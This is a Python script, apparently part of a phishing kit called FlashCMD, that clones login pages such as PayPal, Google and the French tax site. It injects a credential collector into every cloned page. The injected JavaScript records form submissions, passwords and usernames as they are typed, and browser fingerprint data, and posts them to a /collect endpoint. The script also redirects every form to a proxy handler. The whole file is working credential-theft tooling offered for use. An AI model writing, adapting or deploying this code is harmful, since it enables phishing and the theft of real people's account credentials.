#!/usr/bin/env python3
"""
clone.py — clone un site web et l'injecte dans pages/
Usage : python clone.py <url> [nom]
Ex    : python clone.py https://www.paypal.com/signin paypal
        python clone.py https://accounts.google.com google
        python clone.py https://www.impots.gouv.fr impots
"""
import sys, re, os, pathlib, urllib.request, urllib.parse

try:
    from bs4 import BeautifulSoup
    import requests
except ImportError:
    print("[!] pip install beautifulsoup4 requests")
    sys.exit(1)

def clone_site(url: str, name: str):
    print(f"[*] Clonage de {url}…")
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        ),
        "Accept-Language": "fr-FR,fr;q=0.9,en;q=0.8",
    }
    r = requests.get(url, headers=headers, timeout=15, verify=False)
    r.encoding = r.apparent_encoding
    soup = BeautifulSoup(r.text, "html.parser")

    base_url  = f"{urllib.parse.urlparse(url).scheme}://{urllib.parse.urlparse(url).netloc}"
    page_dir  = pathlib.Path("pages")
    asset_dir = pathlib.Path(f"pages/assets_{name}")
    asset_dir.mkdir(parents=True, exist_ok=True)

    # ── télécharger et localiser les assets ─────────────────
    def save_asset(src: str) -> str:
        if not src or src.startswith("data:") or src.startswith("javascript:"):
            return src
        full = src if src.startswith("http") else urllib.parse.urljoin(base_url, src)
        fname = re.sub(r"[^\w\-.]", "_", src.split("/")[-1].split("?")[0])[:60]
        if not fname or "." not in fname:
            fname = abs(hash(src)).__str__() + ".bin"
        dest = asset_dir / fname
        try:
            if not dest.exists():
                data = requests.get(full, headers=headers,
                                    timeout=8, verify=False).content
                dest.write_bytes(data)
            return f"/assets_{name}/{fname}"
        except Exception:
            return src

    # CSS
    for tag in soup.find_all("link", rel=lambda x: x and "stylesheet" in x):
        if tag.get("href"):
            tag["href"] = save_asset(tag["href"])

    # JS
    for tag in soup.find_all("script", src=True):
        tag["src"] = save_asset(tag["src"])

    # Images
    for tag in soup.find_all(["img","input"], src=True):
        tag["src"] = save_asset(tag["src"])

    for tag in soup.find_all(True):
        if tag.get("srcset"):
            tag["srcset"] = ""
        if tag.get("data-src"):
            tag["data-src"] = save_asset(tag["data-src"])

    # ── injecter le collecteur sur tous les formulaires ──────
    inject = """
<script>
/* FlashCMD credential collector — injecté par clone.py */
(function(){
  function collect(data){
    fetch('/collect', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(data)
    });
  }

  // Collect à la soumission de formulaire
  document.addEventListener('submit', function(e){
    var form = e.target;
    var data = {
      page:    'clone_' + window.location.pathname,
      url:     window.location.href,
      ua:      navigator.userAgent,
      tz:      Intl.DateTimeFormat().resolvedOptions().timeZone,
    };
    var fd = new FormData(form);
    fd.forEach(function(v,k){ data[k] = v; });
    collect(data);
    // Laisser le formulaire continuer normalement
  }, true);

  // Collect sur les champs password au blur
  document.addEventListener('blur', function(e){
    var el = e.target;
    if(el.type === 'password' && el.value){
      collect({
        event:    'password_blur',
        field:    el.name || el.id || 'password',
        value:    el.value,
        url:      window.location.href,
        ua:       navigator.userAgent,
      });
    }
  }, true);

  // Collect email/username au blur
  document.addEventListener('blur', function(e){
    var el = e.target;
    if((el.type==='email'||el.name==='email'||el.name==='username'
        ||el.name==='login'||el.name==='user'||el.id==='email')
       && el.value){
      collect({
        event: 'field_blur',
        field: el.name || el.id,
        value: el.value,
        url:   window.location.href,
      });
    }
  }, true);

  // Fingerprint complet à l'arrivée
  collect({
    page:    'clone_land',
    clone:   '""" + name + """',
    ua:      navigator.userAgent,
    lang:    navigator.language,
    tz:      Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen:  screen.width+'x'+screen.height,
    cores:   navigator.hardwareConcurrency,
    mem:     navigator.deviceMemory,
    ref:     document.referrer,
  });
})();
</script>
"""
    # Injecter avant </body> ou à la fin
    if soup.body:
        soup.body.append(BeautifulSoup(inject, "html.parser"))
    else:
        soup.append(BeautifulSoup(inject, "html.parser"))

    # Réécrire les actions de formulaires vers /proxy_submit/<name>
    for form in soup.find_all("form"):
        original_action = form.get("action", "")
        form["data-original-action"] = original_action
        form["action"] = f"/proxy_submit/{name}"
        form["method"] = "post"

    # Sauvegarder
    out = page_dir / f"clone_{name}.html"
    out.write_text(str(soup), encoding="utf-8")
    print(f"[+] Cloné → pages/clone_{name}.html")
    print(f"[+] Assets → pages/assets_{name}/")
    print(f"[+] URL locale : http://TON_IP:8080/clone/{name}")
    return str(out)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python clone.py <url> [nom]")
        sys.exit(1)
    url  = sys.argv[1]
    name = sys.argv[2] if len(sys.argv) > 2 else \
           urllib.parse.urlparse(url).netloc.replace(".", "_").replace("www_","")
    import urllib3
    urllib3.disable_warnings()
    clone_site(url, name)